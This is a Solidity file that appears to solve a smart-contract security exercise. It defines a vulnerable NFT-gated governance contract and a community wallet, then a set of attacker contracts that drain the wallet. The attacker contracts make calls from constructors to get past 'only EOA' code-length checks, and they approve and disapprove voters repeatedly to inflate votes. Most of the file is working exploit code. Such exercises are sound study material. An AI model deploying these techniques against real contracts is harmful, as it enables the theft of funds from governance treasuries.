// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

import "hardhat/console.sol";

contract OligarchyNFT is ERC721 {
    constructor(address attacker) ERC721("Oligarch", "OG") {
        _mint(attacker, 1);
    }

    function _beforeTokenTransfer(address from, address, uint256, uint256) internal virtual override {
        require(from == address(0), "Cannot transfer nft"); // oligarch cannot transfer the NFT
    }
}

contract Governance {
    IERC721 private immutable oligargyNFT;
    CommunityWallet public immutable communityWallet;
    mapping(uint256 => bool) public idUsed;
    mapping(address => bool) public alreadyVoted;

    struct Appointment {
        //approvedVoters: mapping(address => bool),
        uint256 appointedBy; // oligarchy ids are > 0 so we can use this as a flag
        uint256 numAppointments;
        mapping(address => bool) approvedVoter;
    }

    struct Proposal {
        uint256 votes;
        bytes data;
    }

    mapping(address => Appointment) public viceroys;
    mapping(uint256 => Proposal) public proposals;

    constructor(ERC721 _oligarchyNFT) payable {
        oligargyNFT = _oligarchyNFT;
        communityWallet = new CommunityWallet{value: msg.value}(address(this));
    }

    /*
     * @dev an oligarch can appoint a viceroy if they have an NFT
     * @param viceroy: the address who will be able to appoint voters
     * @param id: the NFT of the oligarch
     */
    function appointViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(!idUsed[id], "already appointed a viceroy");
        require(viceroy.code.length == 0, "only EOA");

        idUsed[id] = true;
        viceroys[viceroy].appointedBy = id;
        viceroys[viceroy].numAppointments = 5;
    }

    function deposeViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(viceroys[viceroy].appointedBy == id, "only the appointer can depose");

        idUsed[id] = false;
        delete viceroys[viceroy];
    }

    function approveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(voter != msg.sender, "cannot add yourself");
        require(!viceroys[msg.sender].approvedVoter[voter], "cannot add same voter twice");
        require(viceroys[msg.sender].numAppointments > 0, "no more appointments");
        require(voter.code.length == 0, "only EOA");

        viceroys[msg.sender].numAppointments -= 1;
        viceroys[msg.sender].approvedVoter[voter] = true;
    }

    function disapproveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(viceroys[msg.sender].approvedVoter[voter], "cannot disapprove an unapproved address");
        viceroys[msg.sender].numAppointments += 1;
        delete viceroys[msg.sender].approvedVoter[voter];
    }

    function createProposal(address viceroy, bytes calldata proposal) external {
        require(
            viceroys[msg.sender].appointedBy != 0 || viceroys[viceroy].approvedVoter[msg.sender],
            "sender not a viceroy or voter"
        );

        uint256 proposalId = uint256(keccak256(proposal));
        proposals[proposalId].data = proposal;
    }

    function voteOnProposal(uint256 proposal, bool inFavor, address viceroy) external {
        require(proposals[proposal].data.length != 0, "proposal not found");
        require(viceroys[viceroy].approvedVoter[msg.sender], "Not an approved voter");
        require(!alreadyVoted[msg.sender], "Already voted");
        if (inFavor) {
            proposals[proposal].votes += 1;
        }
        alreadyVoted[msg.sender] = true;
    }

    function executeProposal(uint256 proposal) external {
        require(proposals[proposal].votes >= 10, "Not enough votes");
        (bool res,) = address(communityWallet).call(proposals[proposal].data);
        require(res, "call failed");
    }
}

contract CommunityWallet {
    address public governance;

    constructor(address _governance) payable {
        governance = _governance;
    }

    function exec(address target, bytes calldata data, uint256 value) external {
        require(msg.sender == governance, "Caller is not governance contract");
        (bool res,) = target.call{value: value}(data);
        require(res, "call failed");
    }

    fallback() external payable {}
}

contract GovernanceAttacker {
    //address victim;

    constructor() {
        //victim = v;
    }

    function attack(address victim) external {
        ViceroyWorker vi = new ViceroyWorker(victim);
        vi.attack(victim);
    }

    function appointViceroy(address victim) external {
        Governance(victim).appointViceroy(msg.sender, 1);
    }
}

contract ViceroyWorker {
    uint256 pId;

    constructor(address victim) {
        console.log("AAA");
        GovernanceAttacker(msg.sender).appointViceroy(victim);
        console.log("BBB");
        bytes memory proposal =
            abi.encodeWithSignature("exec(address,bytes,uint256)", tx.origin, "", 10000000000000000000);
        uint256 proposalId = uint256(keccak256(proposal));
        console.log(proposalId);
        //console.log();
        Governance(victim).createProposal(address(0), proposal);
        pId = proposalId;
    }

    function attack(address victim) public {
        for (uint256 i = 0; i < 11; i++) {
            new VoterWorker(victim, pId);
            //Governance(victim).approveVoter(address());
        }
        Governance(victim).executeProposal(pId);
    }

    function approveVoter(address victim) public {
        Governance(victim).approveVoter(msg.sender);
    }

    function disapproveVoter(address victim) public {
        Governance(victim).disapproveVoter(msg.sender);
    }
}

contract VoterWorker {
    constructor(address victim, uint256 proposalId) {
        ViceroyWorker(msg.sender).approveVoter(victim);
        Governance(victim).voteOnProposal(proposalId, true, msg.sender);
        ViceroyWorker(msg.sender).disapproveVoter(victim);
    }
}
